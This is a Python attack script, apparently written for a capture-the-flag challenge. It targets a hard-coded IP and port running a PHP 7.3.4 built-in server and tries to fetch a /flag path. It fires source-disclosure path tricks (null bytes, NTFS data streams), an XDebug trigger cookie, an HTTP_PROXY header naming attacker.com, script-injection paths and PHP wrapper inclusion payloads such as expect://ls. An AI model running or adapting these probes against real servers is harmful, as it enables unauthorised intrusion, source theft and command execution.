#!/usr/bin/env python3
"""
PHP 7.3.4 Built-in Server specific tests
"""
import requests
import socket

target = "http://61.147.171.35:51810"
target_host = "61.147.171.35"
target_port = 51810

def test_php_builtin_bugs():
    """Test PHP built-in server specific vulnerabilities"""
    print("Testing PHP built-in server bugs...")
    
    # PHP built-in server source disclosure via certain paths
    paths = [
        # Source disclosure attempts
        "/index.php::$DATA",  # Windows NTFS alternate data stream
        "/index.php.",        # Windows dot bypass
        "/index.php%00",      # Null byte
        "/index.php%00.txt",
        "/index.php%20",      # Space
        "/index.php%2e",      # URL encoded dot
        "/index.php::$INDEX_ALLOCATION",  # NTFS 
        "/index.PHP",         # Case sensitivity
        "/INDEX.PHP",
        "/Index.Php",
        # PHP built-in server path normalization issues
        "/.php",
        "/./index.php",
        "/index.php/.",
        "/index.php//",
        "//index.php",
        "/index.php%23",      # URL encoded #
        "/index.php%3f",      # URL encoded ?
    ]
    
    for path in paths:
        url = target + path
        try:
            r = requests.get(url, timeout=3)
            if r.text != "Hello World!\n" and len(r.text) != 13:
                print(f"[+] Different response for {path}")
                print(f"    Length: {len(r.text)}, Content: {r.text[:100]}")
        except Exception as e:
            if "404" not in str(e):
                print(f"[!] Error for {path}: {e}")

def test_xdebug_rce():
    """Test XDebug RCE - requires xdebug.remote_connect_back enabled"""
    print("\nTesting XDebug RCE...")
    
    # XDebug cookie to trigger debugging
    cookies = {
        "XDEBUG_SESSION": "phpstorm",
    }
    
    headers = {
        "X-Forwarded-For": "127.0.0.1",
    }
    
    # Test if XDebug responds
    r = requests.get(target, cookies=cookies, headers=headers, timeout=5)
    print(f"XDebug test response: {r.status_code}, {r.text[:50]}")

def test_environ_injection():
    """Test environment variable injection via PHP-CGI"""
    print("\nTesting Environment Variable Injection...")
    
    # PHP-CGI environment injection (CVE-2012-1823 style, but for newer PHP)
    headers = {
        "HTTP_PROXY": "http://attacker.com:8080",
    }
    
    r = requests.get(target, headers=headers, timeout=5)
    print(f"HTTP_PROXY injection: {r.status_code}")

def test_php_self_xss():
    """Test PHP_SELF related issues"""
    print("\nTesting PHP_SELF issues...")
    
    # PHP_SELF can sometimes be manipulated
    paths = [
        "/index.php/<script>alert(1)</script>",
        "/index.php/test/../index.php",
        "/index.php/test%00.jpg",
    ]
    
    for path in paths:
        url = target + path
        try:
            r = requests.get(url, timeout=3)
            if "<script>" in r.text:
                print(f"[+] XSS via PHP_SELF: {path}")
        except:
            pass

def raw_request_tests():
    """Send various raw requests to find edge cases"""
    print("\nSending raw HTTP requests...")
    
    requests_list = [
        # Request with very long URL
        b"GET /" + b"A" * 8000 + b" HTTP/1.1\r\nHost: 61.147.171.35:51810\r\n\r\n",
        
        # Request with unusual HTTP version
        b"GET / HTTP/2.0\r\nHost: 61.147.171.35:51810\r\n\r\n",
        
        # Request with malformed headers
        b"GET / HTTP/1.1\r\nHost: 61.147.171.35:51810\r\nFoo\r\n\r\n",
        
        # Request with many headers
        b"GET / HTTP/1.1\r\nHost: 61.147.171.35:51810\r\n" + b"X-Header: value\r\n" * 100 + b"\r\n",
        
        # HTTP/1.0 without Host
        b"GET / HTTP/1.0\r\n\r\n",
        
        # Pipelining
        b"GET / HTTP/1.1\r\nHost: 61.147.171.35:51810\r\n\r\nGET /flag HTTP/1.1\r\nHost: 61.147.171.35:51810\r\n\r\n",
    ]
    
    for i, req in enumerate(requests_list):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target_host, target_port))
            sock.send(req[:2000])  # Limit send size
            response = sock.recv(4096)
            sock.close()
            
            # Check for interesting responses
            if b"Hello World!" not in response and response:
                print(f"[{i}] Interesting response: {response[:200]}")
            else:
                print(f"[{i}] Normal response")
        except Exception as e:
            print(f"[{i}] Error: {e}")

def test_php_wrappers_advanced():
    """Advanced PHP wrapper tests"""
    print("\nAdvanced PHP wrapper tests...")
    
    wrappers = [
        # Compression wrappers
        "compress.zlib://index.php",
        "compress.bzip2://index.php",
        # Glob wrapper
        "glob:///*.php",
        # PHP memory streams
        "php://memory",
        "php://temp",
        # Expect wrapper (if enabled)
        "expect://ls",
        # ZIP wrapper
        "zip://test.zip#file.php",
        # RAR wrapper
        "rar://test.rar#file.php",
    ]
    
    params = ['file', 'page', 'include', 'template', 'path', 'doc', 'f', 'p']
    
    for wrapper in wrappers:
        for param in params:
            url = f"{target}/?{param}={wrapper}"
            try:
                r = requests.get(url, timeout=2)
                if r.text != "Hello World!\n" and len(r.text) > 13:
                    print(f"[+] Wrapper works: {param}={wrapper}")
                    print(f"    Response: {r.text[:100]}")
            except:
                pass

if __name__ == "__main__":
    test_php_builtin_bugs()
    test_xdebug_rce()
    test_environ_injection()
    test_php_self_xss()
    raw_request_tests()
    test_php_wrappers_advanced()
